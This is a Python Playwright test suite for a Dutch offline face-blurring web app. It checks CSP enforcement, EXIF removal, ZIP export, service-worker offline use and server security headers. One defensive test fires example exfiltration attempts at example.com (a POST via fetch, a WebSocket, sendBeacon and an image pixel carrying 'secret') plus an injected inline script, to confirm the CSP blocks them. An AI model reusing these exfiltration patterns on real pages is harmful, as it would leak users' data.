#!/usr/bin/env python3
"""End-to-end release tests (Chromium via Playwright).

    python3 build.py && python3 tests/test_release.py [--quick]

Covers:
  A. portable copy (file://, unzipped from the release ZIP): CSP, no service worker,
     detection, export + EXIF stripping, exfiltration attempts blocked, ZIP splitting,
     browser notice, box deletion regression
  B. hosted on real Caddy and on the Cloudflare Pages simulator: headers per path,
     served files == checksums, service worker + offline, installability, download page
--quick: skip the slow full-dataset detection (uses 2 photos instead of 5).
"""
import hashlib, io, json, os, pathlib, shutil, socket, subprocess, sys, tempfile, time, urllib.request, zipfile
from playwright.sync_api import sync_playwright
from PIL import Image

ROOT = pathlib.Path(__file__).resolve().parents[1]
DIST, SITE = ROOT / "dist", ROOT / "dist/site"
DATA = ROOT / "tests/data"
CADDY = os.environ.get("CADDY", str(ROOT.parent / "tools/caddy"))
SHOTS = pathlib.Path(os.environ.get("SHOTS", DIST / "test-screenshots"))
QUICK = "--quick" in sys.argv
ARGS = ["--use-gl=angle", "--use-angle=swiftshader", "--enable-unsafe-swiftshader"]
EXPECT = {"sample1.jpg": 3, "sample5.jpg": 5, "sample6.jpg": 4, "groep_klein.jpg": (80, 95), "gedraaid.jpg": 0}

results = []
def check(name, ok, detail=""):
    results.append((bool(ok), name, detail))
    print(("  PASS " if ok else "  FAIL ") + name + (f"  [{detail}]" if detail else ""), flush=True)

CSP_HOOK = """
window.__csp = [];
document.addEventListener('securitypolicyviolation', e =>
  window.__csp.push(e.violatedDirective + ' ' + (e.blockedURI || '')));
"""

def sha(b): return hashlib.sha256(b).hexdigest()
def sums():
    return {l.split()[1]: l.split()[0] for l in (SITE / "SHA256SUMS.txt").read_text().splitlines()}

def poll(pg, expr, timeout=180000, every=0.4):
    """Poll a JS expression from Python. (Playwright's wait_for_function evaluates
    strings inside the page, which the tool's CSP correctly blocks.)"""
    end = time.time() + timeout / 1000
    while time.time() < end:
        try:
            if pg.evaluate(expr): return True
        except Exception:
            pass  # page navigating
        time.sleep(every)
    raise TimeoutError(expr)

# TensorFlow.js bundles long.js, which tries to compile a tiny WebAssembly helper inside
# try/catch and falls back to plain JS. The CSP blocks that compile: expected, harmless.
EXPECTED_VIOLATION = "script-src wasm-eval"
def unexpected(viol):
    return [v for v in viol if not v.startswith(EXPECTED_VIOLATION)]

def wait_model(pg):
    poll(pg, "typeof modelReady !== 'undefined' && (modelReady || modelError)")
    return pg.evaluate("modelReady")

def load(pg, files, timeout=900000):
    pg.set_input_files("#in-files", [str(DATA / f) for f in files])
    poll(pg, "state.photos.length && state.photos.every(p => p.status==='done' || p.status==='error')", timeout)
    return dict(pg.evaluate("state.photos.map(p => [p.name, p.faces.length])"))


# ======================================================================= A
def test_portable(p):
    print("\nA. Portable copy (file://)")
    tmp = pathlib.Path(tempfile.mkdtemp(prefix="gv-usb-"))
    zip_path = next((SITE / "download").glob("*.zip"))
    with zipfile.ZipFile(zip_path) as z:
        check("release ZIP integrity", z.testzip() is None)
        z.extractall(tmp)
    folder = next(tmp.iterdir())
    names = sorted(f.name for f in folder.iterdir())
    check("release ZIP contents", names == ["LEESMIJ-README.txt", "LICENSE.txt", "SHA256SUMS.txt", "THIRD-PARTY-NOTICES.txt", "gezichten-vervagen.html"], ", ".join(names))
    html = folder / "gezichten-vervagen.html"
    inner = (folder / "SHA256SUMS.txt").read_text().split()[0]
    check("HTML in ZIP matches its SHA256SUMS", sha(html.read_bytes()) == inner)
    check("HTML in ZIP == hosted app/index.html", html.read_bytes() == (SITE / "app/index.html").read_bytes())

    b = p.chromium.launch(args=ARGS)
    ctx = b.new_context(viewport={"width": 1440, "height": 900}, accept_downloads=True)
    ctx.add_init_script(CSP_HOOK)
    pg = ctx.new_page()
    errors = []
    pg.on("pageerror", lambda e: errors.append(str(e)))
    pg.goto(html.as_uri())
    check("model loads under CSP (file://)", wait_model(pg), pg.inner_text("#model-text"))
    check("footer shows version", "0.1.0" in pg.inner_text("#foot-version"), pg.inner_text("#foot-version"))
    check("no manifest/service worker on file://", pg.evaluate("!document.querySelector('link[rel=manifest]') && !HOSTED"))
    check("browser notice hidden in Chromium", pg.is_hidden("#notice-browser"))
    check("about link points to base URL", pg.get_attribute("#foot-about", "href").startswith("https://"))

    files = ["sample1.jpg", "sample5.jpg"] if QUICK else list(EXPECT)
    t0 = time.time()
    counts = load(pg, files)
    for f in files:
        exp = EXPECT[f]
        ok = exp[0] <= counts[f] <= exp[1] if isinstance(exp, tuple) else counts[f] == exp
        check(f"detection {f}", ok, f"{counts[f]} faces, expected {exp}")
    print(f"     (detection {time.time() - t0:.0f}s)")
    if "gedraaid.jpg" in files:
        dims = pg.evaluate("state.photos.find(p=>p.name==='gedraaid.jpg').w + 'x' + state.photos.find(p=>p.name==='gedraaid.jpg').h")
        check("EXIF rotation applied", dims == "1367x1920", dims)

    # blur two faces, export as single ZIP
    pg.locator(".face").nth(0).click(); pg.locator(".face").nth(1).click()
    pg.click('.step-btn[data-step="export"]'); pg.wait_for_timeout(600)
    with pg.expect_download(timeout=300000) as dl:
        pg.click("#btn-export-zip")
    d = dl.value
    check("single export ZIP name", d.suggested_filename.startswith("vervaagd-") and "deel" not in d.suggested_filename, d.suggested_filename)
    z = zipfile.ZipFile(d.path())
    check("export ZIP valid", z.testzip() is None and len(z.namelist()) == len(files), f"{len(z.namelist())} files")
    exif_free = all(len(Image.open(io.BytesIO(z.read(n))).getexif()) == 0 for n in z.namelist())
    check("exported photos carry no EXIF/GPS", exif_free)
    pg.screenshot(path=str(SHOTS / "A1-export.png"))

    # ZIP splitting: shrink the part limit so this small set needs several parts
    pg.evaluate("CONFIG.zipPartBytes = 1")  # force one photo per part
    downloads = []
    pg.on("download", lambda dd: downloads.append(dd))
    pg.click("#btn-export-zip")
    poll(pg, "document.querySelector('#ex-status').classList.contains('success')", 300000)
    pg.wait_for_timeout(1500)
    names = sorted(dd.suggested_filename for dd in downloads)
    total = sum(len(zipfile.ZipFile(dd.path()).namelist()) for dd in downloads)
    valid = all(zipfile.ZipFile(dd.path()).testzip() is None for dd in downloads)
    check("ZIP export splits into numbered parts", len(downloads) >= 2 and all("-deel" in n for n in names), ", ".join(names))
    check("split parts valid and complete", valid and total == len(files), f"{total} photos in {len(downloads)} parts")
    check("status reports parts", "ZIP" in pg.inner_text("#ex-status-text"), pg.inner_text("#ex-status-text"))

    # exfiltration attempts must be blocked by the CSP
    v0 = pg.evaluate("window.__csp")
    check("no unexpected CSP violations during normal use", not unexpected(v0), "; ".join(v0))
    blocked = pg.evaluate("""async () => {
      const r = {};
      try { await fetch('https://example.com/upload', {method:'POST', body:'x'}); r.fetch = 'SENT'; } catch (e) { r.fetch = 'blocked'; }
      try { const ws = new WebSocket('wss://example.com'); r.ws = 'opened'; } catch (e) { r.ws = 'blocked'; }
      r.beacon = navigator.sendBeacon('https://example.com/b', 'x') ? 'queued' : 'blocked';
      const img = new Image(); img.src = 'https://example.com/pixel.png?d=secret';
      await new Promise(res => setTimeout(res, 800));
      return r;
    }""")
    viol = pg.evaluate("window.__csp")
    check("fetch/XHR to a server blocked", blocked["fetch"] == "blocked", json.dumps(blocked))
    n_connect = sum(1 for v in viol if v.startswith("connect-src"))
    beacon_ok = blocked["beacon"] == "blocked" or n_connect >= 2  # sendBeacon may report 'queued' and be blocked afterwards
    check("beacon + image-pixel exfiltration blocked", beacon_ok and any(v.startswith("img-src") for v in viol), "; ".join(viol))
    check("WebSocket blocked", blocked["ws"] == "blocked" or any(v.startswith("connect-src") and "wss:" in v for v in viol) or n_connect >= 3, blocked["ws"])
    injected = pg.evaluate("""() => { const s = document.createElement('script'); s.textContent = 'window.__pwned = 1'; document.body.appendChild(s); return !!window.__pwned; }""")
    check("injected inline script does not run", injected is False)
    check("no page errors", not errors, "; ".join(errors[:3]))
    ctx.close()

    # regression: delete a box with the × (mouse)
    ctx = b.new_context(viewport={"width": 1440, "height": 900}); pg = ctx.new_page()
    pg.goto(html.as_uri()); wait_model(pg); load(pg, ["sample5.jpg"])
    pg.evaluate("openPhoto(0)"); pg.wait_for_timeout(800)
    n0 = pg.evaluate("state.photos[0].faces.length")
    bx = pg.locator(".box").first.bounding_box()
    pg.mouse.move(bx["x"] + bx["width"] / 2, bx["y"] + bx["height"] / 2)
    x = pg.locator(".box").first.locator(".x").bounding_box()
    pg.mouse.move(x["x"] + x["width"] / 2, x["y"] + x["height"] / 2, steps=10); pg.mouse.down(); pg.mouse.up()
    pg.wait_for_timeout(300)
    check("regression: × removes a box", pg.evaluate("state.photos[0].faces.length") == n0 - 1)
    ctx.close()

    # Firefox/Safari-like browser: no File System Access API
    ctx = b.new_context(viewport={"width": 1440, "height": 900})
    ctx.add_init_script("for (const o of [window, Window.prototype]) { try { delete o.showDirectoryPicker; delete o.showSaveFilePicker; } catch (e) {} }")
    pg = ctx.new_page(); pg.goto(html.as_uri()); wait_model(pg)
    check("simulated non-Chromium: API removed", pg.evaluate("!window.showDirectoryPicker"))
    check("browser notice shown", pg.is_visible("#notice-browser"), pg.inner_text("#notice-browser")[:70])
    pg.screenshot(path=str(SHOTS / "A2-notice-nl.png"))
    pg.click('.lang button[data-lang="en"]')
    check("notice translated (EN)", "This browser" in pg.inner_text("#notice-browser"))
    load(pg, ["sample1.jpg"]); pg.click('.step-btn[data-step="export"]'); pg.wait_for_timeout(400)
    check("'save to folder' hidden, ZIP offered", pg.is_hidden("#btn-export-dir") and pg.is_enabled("#btn-export-zip"))
    ctx.close(); b.close()
    shutil.rmtree(tmp, ignore_errors=True)


# ======================================================================= B
def free(port):
    with socket.socket() as s:
        return s.connect_ex(("127.0.0.1", port)) != 0

def wait_up(url, t=20):
    for _ in range(t * 10):
        try: urllib.request.urlopen(url, timeout=1); return True
        except Exception: time.sleep(0.1)
    return False

def get(url, method="GET"):
    req = urllib.request.Request(url, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        return r.status, dict(r.headers), (r.read() if method == "GET" else b"")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), b""

def test_headers(base, label, meta_csp):
    s = sums()
    st, h, body = get(base + "/app/")
    check(f"[{label}] /app/ served", st == 200)
    check(f"[{label}] /app/ bytes == checksum", sha(body) == s["gezichten-vervagen.html"])
    csp = h.get("Content-Security-Policy", "")
    check(f"[{label}] /app/ CSP header = meta CSP + frame-ancestors", csp == meta_csp + "; frame-ancestors 'none'", csp[:60])
    check(f"[{label}] /app/ no-cache", h.get("Cache-Control") == "no-cache")
    check(f"[{label}] security headers", h.get("X-Content-Type-Options") == "nosniff" and h.get("Referrer-Policy") == "no-referrer" and "camera=()" in h.get("Permissions-Policy", ""))
    st, h, _ = get(base + "/")
    check(f"[{label}] / download page strict CSP, no scripts", st == 200 and "script-src" not in h.get("Content-Security-Policy", "x") and "default-src 'none'" in h.get("Content-Security-Policy", ""))
    st, h, _ = get(base + "/app/sw.js")
    check(f"[{label}] sw.js own CSP (connect-src 'self')", h.get("Content-Security-Policy") == "default-src 'none'; connect-src 'self'", h.get("Content-Security-Policy"))
    st, h, _ = get(base + "/app/manifest.webmanifest")
    check(f"[{label}] manifest content-type", h.get("Content-Type", "").startswith("application/manifest+json"), h.get("Content-Type"))
    zname = next((SITE / "download").glob("*.zip")).name
    st, h, body = get(base + "/download/" + zname)
    check(f"[{label}] ZIP served as attachment, bytes == checksum", "attachment" in h.get("Content-Disposition", "") and sha(body) == s[zname])
    st, h, body = get(base + "/SHA256SUMS.txt")
    check(f"[{label}] SHA256SUMS.txt is text/plain", h.get("Content-Type", "").startswith("text/plain"))
    st, _, _ = get(base + "/_headers")
    check(f"[{label}] _headers not published", st == 404, str(st))

def test_hosted_browser(p, base, label):
    prof = tempfile.mkdtemp(prefix="gv-prof-")
    ctx = p.chromium.launch_persistent_context(prof, args=ARGS, viewport={"width": 1440, "height": 900})
    ctx.add_init_script(CSP_HOOK)
    pg = ctx.new_page()
    pg.goto(base + "/app/")
    check(f"[{label}] model loads (hosted)", wait_model(pg))
    pg.evaluate("navigator.serviceWorker.ready.then(() => true)")
    pg.reload(); wait_model(pg)
    check(f"[{label}] service worker controls the page", pg.evaluate("!!navigator.serviceWorker.controller"))
    cdp = ctx.new_cdp_session(pg)
    man = cdp.send("Page.getAppManifest")
    errs = cdp.send("Page.getInstallabilityErrors").get("installabilityErrors", [])
    check(f"[{label}] manifest parsed without errors", not man.get("errors"), json.dumps(man.get("errors"))[:120])
    check(f"[{label}] installable (no installability errors)", not errs, json.dumps(errs)[:160])
    v = pg.evaluate("window.__csp")
    check(f"[{label}] no unexpected CSP violations (hosted)", not unexpected(v), "; ".join(v))
    # offline: reload with the network off -> served from the service worker cache
    ctx.set_offline(True)
    pg.reload()
    ok = wait_model(pg)
    check(f"[{label}] works offline after first visit", ok and pg.evaluate("CONFIG.version") == (ROOT / "VERSION").read_text().strip())
    n = load(pg, ["sample1.jpg"], timeout=300000)
    check(f"[{label}] detection offline", n.get("sample1.jpg") == 3, str(n))
    ctx.set_offline(False)
    pg.screenshot(path=str(SHOTS / f"B-{label}-app.png"))
    # download page
    dp = ctx.new_page(); dp.goto(base + "/")
    dp.wait_for_timeout(500)
    check(f"[{label}] download page: zero CSP violations", dp.evaluate("window.__csp.length") == 0, "; ".join(dp.evaluate("window.__csp")))
    icon_ok = dp.evaluate("[...document.images].every(i => i.complete && i.naturalWidth > 0)")
    check(f"[{label}] download page images load", icon_ok)
    zhref = dp.get_attribute(".nl a[download]", "href")
    check(f"[{label}] download link targets the release ZIP", zhref and zhref.endswith(".zip") and get(base + "/" + zhref)[0] == 200, zhref)
    dp.screenshot(path=str(SHOTS / f"B-{label}-page-nl.png"), full_page=True)
    dp.goto(base + "/#en"); dp.wait_for_timeout(300)
    check(f"[{label}] EN switch shows English", dp.is_visible("main.en") and dp.is_hidden("main.nl"))
    in_view = "(() => { const r = document.querySelector('%s').getBoundingClientRect(); return r.top < innerHeight && r.bottom > 0; })()"
    dp.click('main.en a[href="#verify"]'); dp.wait_for_timeout(1200)  # page uses smooth scrolling
    check(f"[{label}] EN 'verify your download' link stays English and scrolls to it",
          dp.is_visible("main.en") and dp.is_hidden("main.nl") and dp.evaluate(in_view % "#verify"))
    dp.goto(base + "/"); dp.wait_for_timeout(200)
    dp.click('main.nl a[href="#controleren"]'); dp.wait_for_timeout(1200)
    check(f"[{label}] NL 'controleer je download' link works", dp.is_visible("main.nl") and dp.evaluate(in_view % "#controleren"))
    dp.goto(base + "/#en"); dp.wait_for_timeout(200)
    dp.screenshot(path=str(SHOTS / f"B-{label}-page-en.png"))
    dp.set_viewport_size({"width": 390, "height": 844}); dp.goto(base + "/"); dp.wait_for_timeout(300)
    no_hscroll = dp.evaluate("document.documentElement.scrollWidth <= window.innerWidth")
    check(f"[{label}] download page: no horizontal scroll at phone width", no_hscroll)
    dp.screenshot(path=str(SHOTS / f"B-{label}-page-phone.png"), full_page=True)
    ctx.close()
    shutil.rmtree(prof, ignore_errors=True)


def main():
    SHOTS.mkdir(parents=True, exist_ok=True)
    meta_csp = (SITE / "app/index.html").read_text(encoding="utf-8").split('http-equiv="Content-Security-Policy" content="')[1].split('"')[0]
    procs = []
    try:
        # real Caddy with the generated Caddyfile
        env = {**os.environ, "GV_SITE_ADDRESS": "http://localhost:8091", "GV_SITE_ROOT": str(SITE)}
        procs.append(subprocess.Popen([CADDY, "run", "--config", str(DIST / "server/Caddyfile"), "--adapter", "caddyfile"],
                                      env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        procs.append(subprocess.Popen([sys.executable, str(ROOT / "tests/serve_cf.py"), str(SITE), "8092"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        check("Caddy started", wait_up("http://localhost:8091/"))
        check("Cloudflare Pages simulator started", wait_up("http://localhost:8092/"))
        print("\nB. Server headers")
        test_headers("http://localhost:8091", "caddy", meta_csp)
        test_headers("http://localhost:8092", "cf-pages", meta_csp)
        with sync_playwright() as p:
            print("\nB. Hosted in the browser")
            test_hosted_browser(p, "http://localhost:8091", "caddy")
            test_hosted_browser(p, "http://localhost:8092", "cf-pages")
            test_portable(p)
    finally:
        for pr in procs:
            pr.terminate()
    failed = [r for r in results if not r[0]]
    report = [f"Gezichten Vervagen v{(ROOT / 'VERSION').read_text().strip()} — test report ({time.strftime('%Y-%m-%d %H:%M')})",
              f"Chromium (Playwright, headless, SwiftShader WebGL){' — QUICK' if QUICK else ''}", ""]
    report += [("PASS  " if ok else "FAIL  ") + n + (f"  [{d}]" if d else "") for ok, n, d in results]
    report += ["", f"{len(results) - len(failed)}/{len(results)} passed"]
    (DIST / "test-report.txt").write_text("\n".join(report) + "\n", encoding="utf-8")
    print(f"\n{len(results) - len(failed)}/{len(results)} passed — report: {DIST / 'test-report.txt'}")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
